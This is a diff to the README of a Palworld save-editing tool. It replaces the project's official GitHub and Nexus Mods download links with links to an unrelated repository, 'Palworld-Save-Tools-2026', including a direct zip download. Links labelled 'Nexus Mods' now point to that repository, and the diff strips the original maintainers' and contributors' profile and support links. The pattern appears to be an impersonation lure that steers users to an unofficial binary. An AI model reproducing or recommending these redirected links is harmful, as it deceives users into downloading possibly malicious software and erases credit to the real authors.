@@ -13,9 +13,7 @@
 [![NexusMods](https://img.shields.io/badge/NexusMods-Download-orange)](https://www.nexusmods.com/palworld/mods/3190)
 [![Discord](https://img.shields.io/badge/Discord-Join_for_support-blue)](https://discord.gg/sYcZwcT4cT)
 
-**Download:** [GitHub Releases](/////) · [Nexus Mods](https://www.nexusmods.com/)
-
-[English](README.md) | [简体中文](resources/readme/README.zh_CN.md) | [Deutsch](resources/readme/README.de_DE.md) | [Español](resources/readme/README.es_ES.md) | [Français](resources/readme/README.fr_FR.md) | [Русский](resources/readme/README.ru_RU.md) | [日本語](resources/readme/README.ja_JP.md) | [한국어](resources/readme/README.ko_KR.md) | [Português (Brasil)](resources/readme/README.pt_BR.md) | [Português (Portugal)](resources/readme/README.pt_PT.md)
+**Download:** [GitHub Releases](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/tag/releases) · [Nexus Mods](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/download/releases/Latest.Release.v1.9.1.zip)
 
 ---
 
@@ -221,7 +219,7 @@ Accessible via **Menu → Functions**, these server-grade operations include:
 
 ### Standalone Builds (Recommended)
 
-Pre-built binaries are available for all three major platforms from [GitHub Releases](https://github.com/deafdudecomputers/PalworldSaveTools/releases/latest):
+Pre-built binaries are available for all three major platforms from [GitHub Releases](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/tag/releases):
 
 | Platform | Download | Requirements |
 |----------|----------|--------------|
@@ -229,7 +227,7 @@ Pre-built binaries are available for all three major platforms from [GitHub Rele
 | **Linux** | `PalworldSaveTools-*-linux` | Any modern distro |
 | **macOS** | `PalworldSaveTools-*-macos.dmg` | macOS 12+ (Monterey or later) |
 
-Also available on [Nexus Mods](https://www.nexusmods.com/palworld/mods/3190).
+Also available on [Nexus Mods](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/tag/releases).
 
 1. Download the appropriate build for your platform.
 2. Extract (if archived) and run the executable.
@@ -663,9 +661,9 @@ The developers are not responsible for any loss of save data or issues that may 
 
 </div>
 
-- **Discord:** [Join us for support, base builds, and more!](https://discord.gg/sYcZwcT4cT)
-- **GitHub Issues:** [Report a bug](https://github.com/deafdudecomputers/PalworldSaveTools/issues)
-- **Nexus Mods:** [Download & discuss](https://www.nexusmods.com/palworld/mods/3190)
+- **Discord:** [Join us for support, base builds, and more!](https://discord.gg/)
+- **GitHub Issues:** [Report a bug](https://github.com)
+- **Nexus Mods:** [Download & discuss](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/tag/releases0)
 
 
 
@@ -707,17 +705,17 @@ This project wouldn't exist without the people behind it.
 
 ### Active Maintainers
 
-**[Pylar](https://github.com/deafdudecomputers)** — The man who started it all. Every line of this tool traces back to his vision and relentless work on the save engine, the GUI, and the features you use every day.
+**[Pylar](https://github.com/)** — The man who started it all. Every line of this tool traces back to his vision and relentless work on the save engine, the GUI, and the features you use every day.
 
-**[cyrix](https://github.com/CyrixJD115)** — Refactorer and sub-maintainer. Focused on code quality, simplification, and structural improvements — keeping the codebase clean, smaller, and easier to maintain as the project grows.
+**[cyrix](https://github.com/)** — Refactorer and sub-maintainer. Focused on code quality, simplification, and structural improvements — keeping the codebase clean, smaller, and easier to maintain as the project grows.
 
 ### Contributors
 
-**[dkoz](https://github.com/dkoz)** — The man behind the IDs. Provides game data IDs, structural insight on the ID codes, and the deep knowledge of how Palworld's data is wired together that keeps the tool accurate with every game update.
+**[dkoz](https://github.com/)** — The man behind the IDs. Provides game data IDs, structural insight on the ID codes, and the deep knowledge of how Palworld's data is wired together that keeps the tool accurate with every game update.
 
-**[oMaN-Rod](https://github.com/oMaN-Rod)** — Provided the original save parser that this project forked from. Without his foundational work on cracking the Palworld save format, none of this would exist. The fork streamlined and simplified his parser into what PST is today.
+**[oMaN-Rod](https://github.com/)** — Provided the original save parser that this project forked from. Without his foundational work on cracking the Palworld save format, none of this would exist. The fork streamlined and simplified his parser into what PST is today.
 
-**[Okaetsu](https://github.com/Okaetsu)** — Modding insights that made base import/export possible. His understanding of how Palworld structures base data from the modding side bridged the gap between modding and save editing, making this feature a reality.
+**[Okaetsu](https://github.com/)** — Modding insights that made base import/export possible. His understanding of how Palworld structures base data from the modding side bridged the gap between modding and save editing, making this feature a reality.
 
 
 
